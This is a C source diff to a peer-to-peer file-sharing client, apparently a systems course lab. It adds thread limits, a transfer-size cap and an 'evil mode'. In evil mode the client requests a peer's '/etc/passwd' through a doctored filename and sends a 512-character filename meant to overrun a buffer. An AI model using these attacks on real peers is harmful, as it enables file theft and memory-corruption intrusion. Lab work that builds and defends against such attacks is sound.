@@ -32,6 +32,8 @@ int evil_mode;			// nonzero iff this peer should behave badly
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
 
+#define MAX_PARALLEL_OPERATIONS 8
+#define MAX_TOTAL_DL_SIZE 10000000
 
 /*****************************************************************************
  * TASK STRUCTURE
@@ -78,6 +80,23 @@ typedef struct task {
 				// task_pop_peer() removes peers from it, one
 				// at a time, if a peer misbehaves.
 } task_t;
+
+typedef struct
+{
+	task_t *tracker_task, *t;
+	pthread_t thread;
+	void* next;
+} pd_prop_node_t;
+
+typedef struct
+{
+    pthread_t thread;
+    task_t* listen_task;
+    void* next;
+} pu_prop_node_t;
+
+pthread_mutex_t counter_mutex;
+int u_thread_counter;
 
 void
 dispatch_pupload(task_t* listen_task);
@@ -351,6 +370,10 @@ taskbufresult_t write_from_taskbuf(int fd, task_t *t)
 	else {
 		t->head += amt;
 		t->total_written += amt;
+
+		if(t->total_written > MAX_TOTAL_DL_SIZE)
+            die("Too much data transferred; exceeded limit!");
+
 		return TBUF_OK;
 	}
 }
@@ -795,6 +818,35 @@ static void task_download(task_t *t, task_t *tracker_task)
 	task_download(t, tracker_task);
 }
 
+static void task_download_evil(task_t *t, task_t *tracker_task, const char* doctored_filename)
+{
+	int i, ret = -1;
+	assert((!t || t->type == TASK_DOWNLOAD)
+	       && tracker_task->type == TASK_TRACKER);
+
+	// Quit if no peers, and skip this peer
+	if (!t || !t->peer_list) {
+		return;
+	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
+		   && t->peer_list->port == listen_port)
+		goto try_again;
+
+	// Connect to the peer and write the GET command
+	message("* EVIL: Connecting to %s:%d to download '%s'\n",
+		inet_ntoa(t->peer_list->addr), t->peer_list->port,
+		t->filename);
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if (t->peer_fd == -1) {
+		error("* EVIL: Cannot connect to peer: %s\n", strerror(errno));
+		goto try_again;
+	}
+	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", doctored_filename);
+
+    try_again:
+        task_pop_peer(t);
+        task_download_evil(t, tracker_task, doctored_filename);
+}
+
 
 // task_listen(listen_task)
 //	Accepts a connection from some other peer.
@@ -968,6 +1020,11 @@ static void task_upload(task_t *t)
 	task_free(t);
 }
 
+#define BIGNAME_SIZE 512
+#define BIGNAME_PAR_THREADS 10
+
+void*
+pdownload_worker(void* arg);
 
 // main(argc, argv)
 //	The main loop!
@@ -1042,6 +1099,8 @@ int main(int argc, char *argv[])
 		exit(0);
 	}
 
+    if(!evil_mode)
+    {
 	// Connect to the tracker and register our files.
 	tracker_task = start_tracker(tracker_addr, tracker_port);
 
@@ -1054,27 +1113,47 @@ int main(int argc, char *argv[])
 	register_files(tracker_task, myalias);
 
 	// Then accept connections from other peers and upload files to them!
-    dispatch_pupload(listen_task);
+	while(1)
+        dispatch_pupload(listen_task);
 
     // Release held file descriptors
     task_free(listen_task);
+    }
+    else
+    {
+        tracker_task = start_tracker(tracker_addr, tracker_port);
+
+        pd_prop_node_t node;
+        node.next = NULL;
+        node.tracker_task = tracker_task;
+
+        node.t = start_download(tracker_task, "cat1.jpg");
+
+        // Download peer's /etc/passwd file
+        strcpy(node.t->filename, "/etc/passwd");
+
+        pthread_create(&node.thread, NULL, pdownload_worker, (void*) &node);
+        pthread_join(node.thread, NULL);
+
+        // Attempt to exploit buffer overrun in scan
+        char* bigname = (char*)malloc(BIGNAME_SIZE);
+
+        // Fill bigname with A's
+        bigname[BIGNAME_SIZE-1] = 0;
+        int i;
+
+        for(i = 0; i < BIGNAME_SIZE-1; i++)
+        {
+            bigname[i] = 'A';
+        }
+
+        task_t* t = start_download(tracker_task, "cat1.jpg");
+
+        task_download_evil(t, tracker_task, bigname);
+    }
 
 	return 0;
 }
-
-typedef struct
-{
-	task_t *tracker_task, *t;
-	pthread_t thread;
-	void* next;
-} pd_prop_node_t;
-
-typedef struct
-{
-    pthread_t thread;
-    task_t* listen_task;
-    void* next;
-} pu_prop_node_t;
 
 void*
 pupload_worker(void* arg)
@@ -1094,15 +1173,43 @@ pupload_worker(void* arg)
     // Attempt to open the socket
 	t = task_listen(pu_prop_node->listen_task);
 
+	//bool deferred_replacement = false;
+
+	bool create = false;
+	int snapshot_count;
+
+    pthread_mutex_lock(&counter_mutex);
+
     // Socket has been opened; there is a client. Create another
     //  worker to handle more requests
-	pthread_create(&next_node->thread, NULL, pupload_worker, next_node);
+    if(u_thread_counter < MAX_PARALLEL_OPERATIONS)
+    {
+        //deferred_replacement = true;
+        create = true;
+
+        u_thread_counter++;
+
+        snapshot_count = u_thread_counter;
+	}
+
+	pthread_mutex_unlock(&counter_mutex);
+
+	if(create)
+        pthread_create(&next_node->thread, NULL, pupload_worker, next_node);
 
     // Upload the file
-    printf("File is being uploaded...");
+    printf("File is being uploaded... %d\n", snapshot_count);
     task_upload(t);
 
+    // The concurrent pthread was not started; start one to replace this one when it dies
+//    if(deferred_replacement)
+//    {
+//        pthread_create(&next_node->thread, NULL, pupload_worker, next_node);
+//    }
 
+    pthread_mutex_lock(&counter_mutex);
+    u_thread_counter--;
+    pthread_mutex_unlock(&counter_mutex);
 
     return NULL;
 }
@@ -1116,6 +1223,8 @@ dispatch_pupload(task_t* listen_task)
     prop_list->listen_task = listen_task;
     prop_list->next = NULL;
 
+    pthread_mutex_init(&counter_mutex, NULL);
+    u_thread_counter = 1;
     pthread_create(&prop_list->thread, NULL, pupload_worker, prop_list);
 
     // Run along the linked list and join to the processes
